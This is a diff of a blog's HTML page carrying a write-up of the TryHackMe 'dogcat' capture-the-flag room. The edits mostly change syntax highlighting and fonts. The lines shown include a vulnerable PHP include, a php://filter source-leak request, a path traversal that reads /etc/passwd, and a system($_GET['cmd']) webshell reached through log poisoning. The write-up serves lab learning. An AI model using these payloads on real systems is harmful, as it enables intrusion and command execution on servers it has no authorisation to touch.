@@ -8,7 +8,7 @@
   <link rel="stylesheet" type="text/css" href="/css/style.css">
   <link rel="preconnect" href="https://fonts.gstatic.com"> 
   <link
-  href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@500&family=Kanit:wght@600&family=Roboto&family=Electrolize&display=swap&family=Fira+Mono&family=Cousine&display=swapdisplay=swap&family=IBM+Plex+Mono&display=swap&family=Courier+Prime:wght@700&display=swap"
+  href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@500&family=Roboto+Mono&family=Electrolize&display=swap&family=Fira+Mono&family=Cousine&display=swapdisplay=swap&family=IBM+Plex+Mono&display=swap&family=Courier+Prime:wght@700&display=swap"
   rel="stylesheet"> 
   <link rel="preconnect" href="https://fonts.gstatic.com">
   <script src="https://kit.fontawesome.com/65ad30df58.js" crossorigin="anonymous"></script>
@@ -22,6 +22,7 @@
 
 </head>
 
+<body>
 <!-- <h1 class=blogtitle>./fmash16's blog </h1> -->
 <pre style="font-family:'Courier Prime';color:var(--accent-color);text-align:center;font-weight:1000">
  ___               _   ___   ___ 
@@ -82,41 +83,41 @@
 <p><img src="/img/tryhackme_dogcat/6.png" /></p>
 <p>Now we see that we can also check the source of the index.php file using directroy traversal in the same way</p>
 <pre><code>http://10.10.174.171/?view=php://filter/convert.base64-encode/resource=dog/../index</code></pre>
-<div class="sourceCode" id="cb5"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a>&lt;!<span class="kw">DOCCTYPE</span> <span class="kw">HTML</span>&gt;</span>
-<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a>&lt;html&gt;</span>
+<div class="sourceCode" id="cb5"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;!</span><span class="cn">DOCCTYPE</span> <span class="cn">HTML</span><span class="op">&gt;</span></span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>html<span class="op">&gt;</span></span>
 <span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a>&lt;head&gt;</span>
-<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a>    &lt;title&gt;dogcat&lt;/title&gt;</span>
-<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a>    &lt;<span class="fu">link</span> rel=<span class="st">&quot;stylesheet&quot;</span> type=<span class="st">&quot;text/css&quot;</span> href=<span class="st">&quot;/style.css&quot;</span>&gt;</span>
-<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a>&lt;/head&gt;</span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>head<span class="op">&gt;</span></span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a>    <span class="op">&lt;</span>title<span class="op">&gt;</span>dogcat<span class="op">&lt;/</span>title<span class="op">&gt;</span></span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a>    <span class="op">&lt;</span><span class="fu">link</span> rel<span class="op">=</span><span class="st">&quot;stylesheet&quot;</span> type<span class="op">=</span><span class="st">&quot;text/css&quot;</span> href<span class="op">=</span><span class="st">&quot;/style.css&quot;</span><span class="op">&gt;</span></span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;/</span>head<span class="op">&gt;</span></span>
 <span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a>&lt;body&gt;</span>
-<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a>    &lt;h1&gt;dogcat&lt;/h1&gt;</span>
-<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a>    &lt;i&gt;a gallery of various dogs <span class="kw">or</span> cats&lt;/i&gt;</span>
+<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>body<span class="op">&gt;</span></span>
+<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a>    <span class="op">&lt;</span>h1<span class="op">&gt;</span>dogcat<span class="op">&lt;/</span>h1<span class="op">&gt;</span></span>
+<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a>    <span class="op">&lt;</span>i<span class="op">&gt;</span>a gallery of various dogs <span class="op">or</span> cats<span class="op">&lt;/</span>i<span class="op">&gt;</span></span>
 <span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb5-13"><a href="#cb5-13" aria-hidden="true" tabindex="-1"></a>    &lt;div&gt;</span>
-<span id="cb5-14"><a href="#cb5-14" aria-hidden="true" tabindex="-1"></a>        &lt;h2&gt;<span class="kw">W</span>hat would you like to see<span class="ot">?</span>&lt;/h2&gt;</span>
-<span id="cb5-15"><a href="#cb5-15" aria-hidden="true" tabindex="-1"></a>        &lt;a href=<span class="st">&quot;/?view=dog&quot;</span>&gt;&lt;button id=<span class="st">&quot;dog&quot;</span>&gt;<span class="kw">A</span> dog&lt;/button&gt;&lt;/a&gt; &lt;a</span>
-<span id="cb5-16"><a href="#cb5-16" aria-hidden="true" tabindex="-1"></a>href=<span class="st">&quot;/?view=cat&quot;</span>&gt;&lt;button id=<span class="st">&quot;cat&quot;</span>&gt;<span class="kw">A</span> cat&lt;/button&gt;&lt;/a&gt;&lt;br&gt;</span>
-<span id="cb5-17"><a href="#cb5-17" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="ot">?</span>php</span>
-<span id="cb5-18"><a href="#cb5-18" aria-hidden="true" tabindex="-1"></a>            <span class="kw">function</span> containsStr<span class="ot">(</span><span class="kw">$str</span><span class="ot">,</span> <span class="kw">$substr</span><span class="ot">)</span> {</span>
-<span id="cb5-19"><a href="#cb5-19" aria-hidden="true" tabindex="-1"></a>                <span class="kw">return</span> <span class="fu">strpos</span><span class="ot">(</span><span class="kw">$str</span><span class="ot">,</span> <span class="kw">$substr</span><span class="ot">)</span> !== <span class="kw">false</span><span class="ot">;</span></span>
+<span id="cb5-13"><a href="#cb5-13" aria-hidden="true" tabindex="-1"></a>    <span class="op">&lt;</span>div<span class="op">&gt;</span></span>
+<span id="cb5-14"><a href="#cb5-14" aria-hidden="true" tabindex="-1"></a>        <span class="op">&lt;</span>h2<span class="op">&gt;</span><span class="cn">W</span>hat would you like to see<span class="ot">?</span><span class="op">&lt;/</span>h2<span class="op">&gt;</span></span>
+<span id="cb5-15"><a href="#cb5-15" aria-hidden="true" tabindex="-1"></a>        <span class="op">&lt;</span>a href<span class="op">=</span><span class="st">&quot;/?view=dog&quot;</span><span class="op">&gt;&lt;</span>button id<span class="op">=</span><span class="st">&quot;dog&quot;</span><span class="op">&gt;</span><span class="cn">A</span> dog<span class="op">&lt;/</span>button<span class="op">&gt;&lt;/</span>a<span class="op">&gt;</span> <span class="op">&lt;</span>a</span>
+<span id="cb5-16"><a href="#cb5-16" aria-hidden="true" tabindex="-1"></a>href<span class="op">=</span><span class="st">&quot;/?view=cat&quot;</span><span class="op">&gt;&lt;</span>button id<span class="op">=</span><span class="st">&quot;cat&quot;</span><span class="op">&gt;</span><span class="cn">A</span> cat<span class="op">&lt;/</span>button<span class="op">&gt;&lt;/</span>a<span class="op">&gt;&lt;</span>br<span class="op">&gt;</span></span>
+<span id="cb5-17"><a href="#cb5-17" aria-hidden="true" tabindex="-1"></a>        <span class="op">&lt;</span><span class="ot">?</span>php</span>
+<span id="cb5-18"><a href="#cb5-18" aria-hidden="true" tabindex="-1"></a>            <span class="kw">function</span> containsStr(<span class="va">$str</span><span class="ot">,</span> <span class="va">$substr</span>) {</span>
+<span id="cb5-19"><a href="#cb5-19" aria-hidden="true" tabindex="-1"></a>                <span class="cf">return</span> <span class="fu">strpos</span>(<span class="va">$str</span><span class="ot">,</span> <span class="va">$substr</span>) <span class="op">!==</span> <span class="kw">false</span><span class="ot">;</span></span>
 <span id="cb5-20"><a href="#cb5-20" aria-hidden="true" tabindex="-1"></a>            }</span>
-<span id="cb5-21"><a href="#cb5-21" aria-hidden="true" tabindex="-1"></a>            <span class="kw">$ext</span> = <span class="kw">isset</span><span class="ot">(</span><span class="kw">$_GET</span><span class="ot">[</span><span class="st">&quot;ext&quot;</span><span class="ot">])</span> <span class="ot">?</span> <span class="kw">$_GET</span><span class="ot">[</span><span class="st">&quot;ext&quot;</span><span class="ot">]</span> <span class="ot">:</span> <span class="st">&#39;.php&#39;</span><span class="ot">;</span></span>
-<span id="cb5-22"><a href="#cb5-22" aria-hidden="true" tabindex="-1"></a>            <span class="kw">if</span><span class="ot">(</span><span class="kw">isset</span><span class="ot">(</span><span class="kw">$_GET</span><span class="ot">[</span><span class="st">&#39;view&#39;</span><span class="ot">]))</span> {</span>
-<span id="cb5-23"><a href="#cb5-23" aria-hidden="true" tabindex="-1"></a>                <span class="kw">if</span><span class="ot">(</span>containsStr<span class="ot">(</span><span class="kw">$_GET</span><span class="ot">[</span><span class="st">&#39;view&#39;</span><span class="ot">],</span> <span class="st">&#39;dog&#39;</span><span class="ot">)</span> ||</span>
-<span id="cb5-24"><a href="#cb5-24" aria-hidden="true" tabindex="-1"></a>containsStr<span class="ot">(</span><span class="kw">$_GET</span><span class="ot">[</span><span class="st">&#39;view&#39;</span><span class="ot">],</span> <span class="st">&#39;cat&#39;</span><span class="ot">))</span> {</span>
+<span id="cb5-21"><a href="#cb5-21" aria-hidden="true" tabindex="-1"></a>            <span class="va">$ext</span> <span class="op">=</span> <span class="kw">isset</span>(<span class="va">$_GET</span>[<span class="st">&quot;ext&quot;</span>]) <span class="ot">?</span> <span class="va">$_GET</span>[<span class="st">&quot;ext&quot;</span>] <span class="ot">:</span> <span class="st">&#39;.php&#39;</span><span class="ot">;</span></span>
+<span id="cb5-22"><a href="#cb5-22" aria-hidden="true" tabindex="-1"></a>            <span class="cf">if</span>(<span class="kw">isset</span>(<span class="va">$_GET</span>[<span class="st">&#39;view&#39;</span>])) {</span>
+<span id="cb5-23"><a href="#cb5-23" aria-hidden="true" tabindex="-1"></a>                <span class="cf">if</span>(containsStr(<span class="va">$_GET</span>[<span class="st">&#39;view&#39;</span>]<span class="ot">,</span> <span class="st">&#39;dog&#39;</span>) <span class="op">||</span></span>
+<span id="cb5-24"><a href="#cb5-24" aria-hidden="true" tabindex="-1"></a>containsStr(<span class="va">$_GET</span>[<span class="st">&#39;view&#39;</span>]<span class="ot">,</span> <span class="st">&#39;cat&#39;</span>)) {</span>
 <span id="cb5-25"><a href="#cb5-25" aria-hidden="true" tabindex="-1"></a>                    <span class="kw">echo</span> <span class="st">&#39;Here you go!&#39;</span><span class="ot">;</span></span>
-<span id="cb5-26"><a href="#cb5-26" aria-hidden="true" tabindex="-1"></a>                    <span class="kw">include</span> <span class="kw">$_GET</span><span class="ot">[</span><span class="st">&#39;view&#39;</span><span class="ot">]</span> . <span class="kw">$ext</span><span class="ot">;</span></span>
-<span id="cb5-27"><a href="#cb5-27" aria-hidden="true" tabindex="-1"></a>                } <span class="kw">else</span> {</span>
+<span id="cb5-26"><a href="#cb5-26" aria-hidden="true" tabindex="-1"></a>                    <span class="kw">include</span> <span class="va">$_GET</span>[<span class="st">&#39;view&#39;</span>] <span class="op">.</span> <span class="va">$ext</span><span class="ot">;</span></span>
+<span id="cb5-27"><a href="#cb5-27" aria-hidden="true" tabindex="-1"></a>                } <span class="cf">else</span> {</span>
 <span id="cb5-28"><a href="#cb5-28" aria-hidden="true" tabindex="-1"></a>                    <span class="kw">echo</span> <span class="st">&#39;Sorry, only dogs or cats are allowed.&#39;</span><span class="ot">;</span></span>
 <span id="cb5-29"><a href="#cb5-29" aria-hidden="true" tabindex="-1"></a>                }</span>
 <span id="cb5-30"><a href="#cb5-30" aria-hidden="true" tabindex="-1"></a>            }</span>
 <span id="cb5-31"><a href="#cb5-31" aria-hidden="true" tabindex="-1"></a>        <span class="kw">?&gt;</span></span>
-<span id="cb5-32"><a href="#cb5-32" aria-hidden="true" tabindex="-1"></a>    &lt;/div&gt;</span>
-<span id="cb5-33"><a href="#cb5-33" aria-hidden="true" tabindex="-1"></a>&lt;/body&gt;</span>
+<span id="cb5-32"><a href="#cb5-32" aria-hidden="true" tabindex="-1"></a>    <span class="op">&lt;/</span>div<span class="op">&gt;</span></span>
+<span id="cb5-33"><a href="#cb5-33" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;/</span>body<span class="op">&gt;</span></span>
 <span id="cb5-34"><a href="#cb5-34" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb5-35"><a href="#cb5-35" aria-hidden="true" tabindex="-1"></a>&lt;/html&gt;</span></code></pre></div>
+<span id="cb5-35"><a href="#cb5-35" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;/</span>html<span class="op">&gt;</span></span></code></pre></div>
 <p>What’s interesting here is that it allows us to pass an “ext” variable that contains the file extension. On the variable being unset, it adds the default extension of .php</p>
 <p>So we check now if we can read the /etc/passwd file with the following request</p>
 <pre><code>http://10.10.174.171/?view=dog/../../../../etc/passwd&amp;ext=</code></pre>
@@ -130,10 +131,10 @@
 <p>We change the header to hello to test and it works</p>
 <p><img src="/img/tryhackme_dogcat/9.png" /></p>
 <p>Now we test some php commands. First we try the system(“<cmd>”) which is suposed to execute the command on the machine and print us the output</p>
-<div class="sourceCode" id="cb7"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;?php</span> <span class="fu">system</span><span class="ot">(</span><span class="st">&quot;ls&quot;</span><span class="ot">)</span><span class="kw">?&gt;</span></span></code></pre></div>
+<div class="sourceCode" id="cb7"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;?php</span> <span class="fu">system</span>(<span class="st">&quot;ls&quot;</span>)<span class="kw">?&gt;</span></span></code></pre></div>
 <p>But executing this once, we somehow break the machine and cannot access the log any more <img src="/img/tryhackme_dogcat/10.png" /></p>
 <p>Next we try a webshell like approach that will get a command passed in the cmd variable and execute it.</p>
-<div class="sourceCode" id="cb8"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="fu">system</span><span class="ot">(</span><span class="kw">$_GET</span><span class="ot">[</span><span class="st">&#39;cmd&#39;</span><span class="ot">]);</span></span></code></pre></div>
+<div class="sourceCode" id="cb8"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="fu">system</span>(<span class="va">$_GET</span>[<span class="st">&#39;cmd&#39;</span>])<span class="ot">;</span></span></code></pre></div>
 <p><img src="/img/tryhackme_dogcat/11.png" /></p>
 <p>And we have command execution!</p>
 <h2 id="user-www-data">User www-data</h2>
